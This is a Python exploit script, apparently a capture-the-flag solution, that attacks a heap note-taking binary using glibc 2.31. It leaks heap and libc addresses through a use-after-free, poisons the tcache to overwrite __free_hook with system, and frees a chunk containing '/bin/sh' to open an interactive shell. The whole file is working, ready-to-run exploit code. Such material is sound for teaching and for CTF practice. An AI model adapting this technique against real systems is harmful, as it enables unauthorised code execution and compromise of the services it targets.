#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc-2.31.so")
ld = ptr.ELF("./ld-2.31.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def create(data: bytes):
        io.sendlineafter(b"Exit\n", b"1")
        if len(data) < 0xA:
            io.sendlineafter(b"note\n", data)
        elif len(data) == 0xA:
            io.sendafter(b"note\n", data)
        else:
            ptr.logger.error("data is too long")
            exit()
        return

    def create_large(data: bytes):
        io.sendlineafter(b"Exit\n", b"10")
        if len(data) < 0xA:
            io.sendlineafter(b"note\n", data)
        elif len(data) == 0xA:
            io.sendafter(b"note\n", data)
        else:
            ptr.logger.error("data is too long")
            exit()
        return

    def delete(idx: int):
        io.sendlineafter(b"Exit\n", b"2")
        io.sendlineafter(b"delete?\n", str(idx).encode())
        return

    def edit(idx: int, data: bytes):
        io.sendlineafter(b"Exit\n", b"3")
        io.sendlineafter(b"edit?\n", str(idx).encode())
        if len(data) == 0x64:
            io.send(data)
        elif len(data) < 0x64:
            io.sendline(data)
        else:
            ptr.logger.error("data is too long")
            exit()
        return

    def read(idx) -> bytes:
        io.sendlineafter(b"Exit\n", b"4")
        io.sendlineafter(b"read?\n", str(idx).encode())
        return io.recvuntil(b"\nEnter", drop=True)

    # heap leak
    create(b"A")  # 1
    create(b"B")  # 2
    delete(1)
    delete(2)
    heap_base = ptr.u64(read(2)) - 0x2A0
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # libc leak
    create_large(b"A")  # 3
    create(b"B")  # 4
    create(b"B")  # 5
    create(b"A")  # 6 prevent consolidation
    delete(3)
    libc.base = ptr.u64(read(3)) - 0x1EBBE0

    # tcache poisoning
    free_hook = unwrap(libc.symbol("__free_hook"))
    payload = b"/bin/sh\0"
    payload += b"A" * (0x28 - len(payload))
    payload += ptr.p64(0x31)
    payload += ptr.p64(free_hook)
    delete(6)
    delete(4)
    edit(5, payload)
    create(b"A")
    create(ptr.p64(unwrap(libc.symbol("system"))))
    delete(5)

    io.interactive()
    return


if __name__ == "__main__":
    main()
